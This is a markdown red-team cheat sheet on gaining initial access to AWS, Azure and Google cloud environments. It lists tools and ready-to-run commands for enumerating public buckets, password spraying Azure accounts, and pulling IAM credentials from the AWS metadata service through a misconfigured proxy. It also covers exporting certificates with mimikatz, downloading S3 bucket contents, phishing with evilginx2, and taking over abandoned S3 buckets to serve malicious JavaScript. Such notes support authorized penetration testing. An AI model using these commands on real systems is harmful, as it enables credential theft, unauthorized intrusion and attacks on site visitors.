# Initial access attacks
## Public storage
### Find data in public storage
- https://github.com/initstring/cloud_enum can scan all three cloud services for multiple services.

#### Public azure blobs
- https://github.com/NetSPI/MicroBurst
```
Invoke-EnumerateAzureBlobs –Base <base name>
```

#### Public AWS blobs
- https://github.com/RhinoSecurityLabs/pacu

#### Public Google Storage Buckets
- https://github.com/initstring/cloud_enum

## Public SQL database
- https://github.com/initstring/cloud_enum can scan all three cloud services for multiple services.
- Might be able to bruteforce port 1433

## Key disclosure in public repositories
- Scavange repos for keys
- Find keys in realtime: https://github.com/eth0izzle/shhgit
- Tools for finding secrets
  - Gitleaks https://github.com/zricethezav/gitleaks
  - Gitrob https://github.com/michenriksen/gitrob
  - Truffle hog https://github.com/dxa4481/truffleHog

### Gitleaks
- https://github.com/zricethezav/gitleaks
#### Search for secrets
```
./gitleaks detect -v source ~/tools/gitleaks/
```

#### Use web browser to view the commit
```
https://github.com/[git account]/[repo name]/commit/[commit ID]
```

## Password attacks
- Credential stuffing (databreaches)
- Password spraying

#### Password spraying Azure
- https://github.com/dafthack/MSOLSpray
- https://github.com/ustayready/fireprox
```
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList validemails.txt -Password <PASSWORD> -Verbose
```

## Web server exploitation
- Here are some generic things ot look for:
  - Out of date web technologies with known vulns
  - SQL or command injection vulns
  - Server-side-request forgery (SSRF)
  - Arbitrary file upload
- Good place to start post shell:
  - Creds in metadata service
  - Certificates
  - Environment variables
  - Storage Accounts

### AWS Instance Metadata
- Metadata endpoint is hosted on a non routable IP adress at 169.254.169.254
- Can contain access/secret keys to AWS and IAM credentials
- Server compromise or SSRF vulnerabilities might allow remote attackers to reach it.
- IAM credentials can be stored here ```http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>```
- New version requeres token, a put request is send and then responded to with a token. Then that token can be used to query data

#### Instance Metadata Service URL
```
http://169.254.169.254/latest/meta-data
```

#### Additional IAM creds possibly available here

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>
```

- Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS and misconfigured

```bash
curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
```

#### IMDS Version 2 has some protections 
- but these commands can be used to access it
```bash
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` 
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

### Reused access certs as private keys on web servers
1. Comprimise web server
2. Extract certificate with mimkatz
3. Use it to authenticate to Azure
```
mimikatz# crypto::capi
mimikatz# privilege::debug
mimikatz# crypto::cng
mimikatz# crypto::certificates /systemstore:local_machine /store:my /export
```

## Phishing
- Still the #1 method of compromise
- Two primary phishing techniques:
  - Cred harvesting / session hijacking
    -  https://github.com/drk1wi/Modlishka
    -  https://github.com/kgretzky/evilginx2
  - Remote workstation compromise w/ C2

#### Google workspace calendar event injection
- Silently injects events to target calendars
- Bypasses the “don’t auto-add” setting
- Include link to phishing page
- https://www.blackhillsinfosec.com/google-calendar-event-injection-mailsniper/

## S3 bucket pillaging
#### Brute force bucket names
- https://github.com/initstring/cloud_enum
```
python3 cloud_enum.py -k <KEYWORD>
```

#### Use the AWS CLI to list the files of the s3 bucket
```
sudo aws s3 ls s3://<BUCKET> --profile <PROFILE>
```

#### Use the AWS CLI to download the files of the s3 bucket
```
sudo aws s3 sync s3://<BUCKET> s3-files-dir --profile <PROFILE>
```

## S3 code injection
- If a webapp is loading content from an s3 bucket made publicly writeable. Attackers can upload malicious JS to get executed by visitors.

## Domain hijacking
- Hijack S3 domain by finding references in a webapp to S3 buckets that dont exist anymore.
- Or subdomains were linked to S3 buckets with CNAME that still exist.
- When assessing webapps look for 404's to ```*.s3.amazonaws.com```
1. When brute forcing subdomains for an org look for 404’s with ‘NoSuchBucket’ error
2. Go create the S3 bucket with the same name and region
3. 3. Load malicious content to the new S3 bucket that will be executed when visitors hit the site
